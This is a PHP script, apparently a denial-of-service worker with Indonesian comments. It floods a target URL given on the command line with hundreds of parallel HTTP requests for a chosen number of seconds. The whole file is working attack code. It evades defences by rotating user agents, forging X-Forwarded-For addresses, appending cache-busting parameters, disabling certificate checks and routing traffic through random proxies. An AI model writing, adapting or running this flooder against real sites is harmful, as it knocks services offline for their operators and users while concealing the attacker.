<?php
// Eksekusi via CLI atau background cron
// php attack_worker.php https://target.com 5000

$target = $argv[1] ?? '';
$duration = $argv[2] ?? 60;

if(!$target) die("Usage: php attack_worker.php <target> [duration_seconds]\n");

$endTime = time() + $duration;

// Multi-curl untuk parallel request
$multiHandle = curl_multi_init();
$handles = [];

for($i=0; $i<500; $i++) {
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $target . (strpos($target,'?')?'&':'?').'_='.uniqid(),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_TIMEOUT => 2,
        CURLOPT_USERAGENT => randomUserAgent(),
        CURLOPT_HTTPHEADER => randomHeaders(),
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_PROXY => getRandomProxy(),
        CURLOPT_PROXYTYPE => CURLPROXY_HTTP
    ]);
    curl_multi_add_handle($multiHandle, $ch);
    $handles[] = $ch;
}

echo "[WORKER] Attacking $target for $duration seconds\n";

while(time() < $endTime) {
    curl_multi_exec($multiHandle, $running);
    usleep(1000);
}

foreach($handles as $ch) curl_multi_remove_handle($multiHandle, $ch);
curl_multi_close($multiHandle);
echo "[WORKER] Attack finished\n";

function randomUserAgent() {
    $agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Firefox/121.0',
        'Mozilla/5.0 (X11; Linux x86_64) Safari/537.36'
    ];
    return $agents[array_rand($agents)];
}

function randomHeaders() {
    return [
        'X-Forwarded-For: '.rand(1,255).'.'.rand(1,255).'.'.rand(1,255).'.'.rand(1,255),
        'Accept-Language: id-ID,id;q=0.9',
        'Cache-Control: no-cache'
    ];
}

function getRandomProxy() {
    static $proxies = null;
    if(!$proxies) {
        $proxyFile = __DIR__.'/proxies.txt';
        if(file_exists($proxyFile)) {
            $proxies = file($proxyFile, FILE_IGNORE_NEW_LINES);
        } else {
            $proxies = [];
        }
    }
    return $proxies ? $proxies[array_rand($proxies)] : null;
}
?>